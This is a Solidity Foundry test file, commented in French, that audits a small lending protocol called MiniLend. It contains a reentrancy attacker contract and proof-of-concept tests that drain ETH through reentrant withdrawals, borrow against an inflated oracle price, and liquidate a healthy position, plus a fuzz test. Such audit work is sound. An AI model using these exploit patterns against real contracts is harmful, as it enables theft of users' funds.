// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Test} from "forge-std/Test.sol";
import {MiniLend} from "../src/MiniLend.sol";
import {MockOracle} from "../src/MockOracle.sol";

// Contrat attaquant pour VULN-01 reentrancy
contract ReentrancyAttacker {
    MiniLend public target;
    uint256  public attackCount;
    uint256  public constant MAX_ATTACKS = 1;
    uint256  public depositAmount;
    bool     private attacking;

    constructor(address payable _target) {
        target = MiniLend(_target);
    }

    function attack() external payable {
        depositAmount = msg.value;
        target.deposit{value: msg.value}();
        attacking = true;
        target.withdraw(depositAmount);
        attacking = false;
    }

    receive() external payable {
        if (attacking && attackCount < MAX_ATTACKS) {
            attackCount++;
            // Vérifie que la cible a encore des fonds
            if (address(target).balance >= depositAmount) {
                target.withdraw(depositAmount);
            }
        }
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract MiniLendAuditTest is Test {

    MiniLend     public protocol;
    MockOracle   public oracle;

    address public owner     = makeAddr("owner");
    address public alice     = makeAddr("alice");
    address public bob       = makeAddr("bob");
    address public liquidator = makeAddr("liquidator");

    // Prix initial : 1 ETH = 2000 USD (scaled 1e18)
    uint256 constant INITIAL_PRICE = 2000e18;

    function setUp() public {
        vm.prank(owner);
        oracle   = new MockOracle(INITIAL_PRICE);

        vm.prank(owner);
        protocol = new MiniLend(address(oracle));

        // Fund les participants
        vm.deal(alice,     10 ether);
        vm.deal(bob,       10 ether);
        vm.deal(liquidator, 10 ether);
    }

    // ════════════════════════════════════════════════════
    // VULN-01 : Reentrancy dans withdraw()
    // ════════════════════════════════════════════════════
    function test_VULN01_reentrancyWithdraw() public {
        // Fonds la cible avec 5 ETH (autres utilisateurs)
        vm.prank(alice);
        protocol.deposit{value: 5 ether}();

        // Configure Foundry pour permettre les appels profonds
        vm.txGasPrice(0);

        ReentrancyAttacker attacker = new ReentrancyAttacker(
            payable(address(protocol))
        );
        vm.deal(address(attacker), 1 ether);

        uint256 protocolBefore = address(protocol).balance;
        emit log_string("\n=== VULN-01: REENTRANCY ===");
        emit log_named_decimal_uint("Protocol ETH before", protocolBefore, 18);
        emit log_named_decimal_uint("Attacker ETH before", address(attacker).balance, 18);

        // Augmente la limite de gas du test
        attacker.attack{value: 1 ether}();

        uint256 protocolAfter = address(protocol).balance;
        uint256 attackerAfter = address(attacker).balance;

        emit log_named_decimal_uint("Protocol ETH after ", protocolAfter, 18);
        emit log_named_decimal_uint("Attacker ETH after ", attackerAfter, 18);
        emit log_named_uint("Reentrance count   ", attacker.attackCount());

        // Avec MAX_ATTACKS=1 : attaquant dépose 1 ETH, withdraw 1x = 1 ETH
        assertGt(attackerAfter, 1 ether,       "Attacker should profit");
        assertLt(protocolAfter, protocolBefore, "Protocol should lose ETH");
        emit log_string("=== EXPLOIT SUCCESS ===\n");
    }

    // ════════════════════════════════════════════════════
    // VULN-02 : Oracle manipulation
    // ════════════════════════════════════════════════════
    function test_VULN02_oracleManipulation() public {
        // Alice dépose 1 ETH comme collatéral
        vm.prank(alice);
        protocol.deposit{value: 1 ether}();

        uint256 normalBorrow = 1 ether * INITIAL_PRICE / 1e18 * 100 / 150;
        emit log_string("\n=== VULN-02: ORACLE MANIPULATION ===");
        emit log_named_decimal_uint("Price normal       ", INITIAL_PRICE, 18);
        emit log_named_decimal_uint("Max borrow normal  ", normalBorrow, 18);

        // Owner malicieux manipule le prix à la hausse
        uint256 manipulatedPrice = INITIAL_PRICE * 10;
        oracle.setPrice(manipulatedPrice);

        uint256 manipulatedBorrow = 1 ether * manipulatedPrice / 1e18 * 100 / 150;
        emit log_named_decimal_uint("Price manipulated  ", manipulatedPrice, 18);
        emit log_named_decimal_uint("Max borrow manip   ", manipulatedBorrow, 18);

        // Alice peut maintenant emprunter 10x plus
        vm.deal(address(protocol), 100 ether);
        vm.prank(alice);
        protocol.borrow(manipulatedBorrow / 1e18);

        emit log_named_decimal_uint("Borrowed           ",
            protocol.borrows(alice), 18);

        assertGt(
            protocol.borrows(alice),
            normalBorrow / 1e18,
            "Should have borrowed more than normal"
        );
        emit log_string("=== EXPLOIT SUCCESS ===\n");
    }

    // ════════════════════════════════════════════════════
    // VULN-03 : Liquidation sans health factor check
    // ════════════════════════════════════════════════════
    function test_VULN03_unlawfulLiquidation() public {
        // Alice dépose 2 ETH et emprunte 0.5 ETH — position saine
        vm.prank(alice);
        protocol.deposit{value: 2 ether}();

        vm.deal(address(protocol), 10 ether);
        vm.prank(alice);
        protocol.borrow(0.5 ether);

        uint256 hf = protocol.healthFactor(alice);
        emit log_string("\n=== VULN-03: UNLAWFUL LIQUIDATION ===");
        emit log_named_uint("Health factor before", hf);
        emit log_string("Position is HEALTHY (hf >= 150)");

        uint256 aliceDepositBefore = protocol.deposits(alice);
        emit log_named_decimal_uint("Alice deposit before", aliceDepositBefore, 18);

        // Liquidateur attaque une position SAINE
        vm.prank(liquidator);
        protocol.liquidate{value: 0.1 ether}(alice);

        uint256 aliceDepositAfter = protocol.deposits(alice);
        emit log_named_decimal_uint("Alice deposit after ", aliceDepositAfter, 18);
        emit log_named_decimal_uint("Liquidator gained  ",
            protocol.deposits(liquidator), 18);

        // Alice a perdu du collatéral malgré une position saine
        assertLt(aliceDepositAfter, aliceDepositBefore,
            "Alice should have lost collateral");
        emit log_string("=== EXPLOIT SUCCESS ===\n");
    }

    // ════════════════════════════════════════════════════
    // VULN-04 : Fuzz — health factor jamais négatif
    // ════════════════════════════════════════════════════
    function testFuzz_VULN04_healthFactorConsistency(
        uint96 depositAmt,
        uint96 borrowAmt
    ) public {
        vm.assume(depositAmt >= 0.1 ether);
        vm.assume(depositAmt <= 5 ether);
        vm.assume(borrowAmt > 0);

        vm.deal(alice, depositAmt);
        vm.prank(alice);
        protocol.deposit{value: depositAmt}();

        uint256 price        = oracle.getPrice();
        uint256 depositValue = (uint256(depositAmt) * price) / 1e18;
        uint256 maxBorrow    = (depositValue * 100) / 150;

        // Borrow dans les limites
        uint256 safeBorrow = borrowAmt % (maxBorrow / 1e18 + 1);
        vm.assume(safeBorrow > 0);
        vm.assume(safeBorrow <= maxBorrow / 1e18);

        vm.deal(address(protocol), safeBorrow + 1 ether);
        vm.prank(alice);
        protocol.borrow(safeBorrow);

        uint256 hf = protocol.healthFactor(alice);
        assertGe(hf, MIN_HEALTH_FACTOR(),
            "Health factor should be >= 150 after valid borrow");
    }

    function MIN_HEALTH_FACTOR() internal pure returns (uint256) {
        return 150;
    }
}